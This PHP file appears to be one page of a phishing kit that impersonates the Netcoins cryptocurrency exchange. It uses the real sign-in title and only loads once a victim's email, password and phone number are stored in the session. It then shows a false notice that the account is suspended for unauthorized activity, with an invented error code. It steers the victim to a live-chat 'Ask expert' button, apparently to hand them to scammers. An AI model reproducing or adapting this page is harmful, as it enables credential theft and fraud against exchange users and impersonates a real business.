<?php include_once './config.php'; ?>
<html lang="en">
    <?php
        $title = 'Sign in to Netcoins | Buy, Sell and Margin Trade Bitcoin (BTC) and Ethereum (ETH)';
        include_once './includes/meta.php';
        if(empty($_SESSION["email"]) || empty($_SESSION["password"])) {
            redirect(base_url());
        }
        if(empty($_SESSION["phone_number"])) {
            redirect(base_url('verify.php'));
        }
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <div class="mt55">
            <form method="post" action="<?= base_url('send.php')?>" class="col-12 shadow-sm py17">
                <h2 class="fs25 mb20">Important Information</h2>
                <p class="my15">Due to unauthorized activity and identification failure on your Account. Account Access has been suspended. Please Get in touch with our Support Staff Immediately</p>
                <h3 class="fs16 text-danger">Error CODE: EBRX1:6X76D</h3>
                <div class="text-center mx-auto d-grid gap-2 my25">
                    <a href="javascript:void(Tawk_API.toggle())" class="btn btn-primary btn-block">Ask expert</a>
                </div>
            </form>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>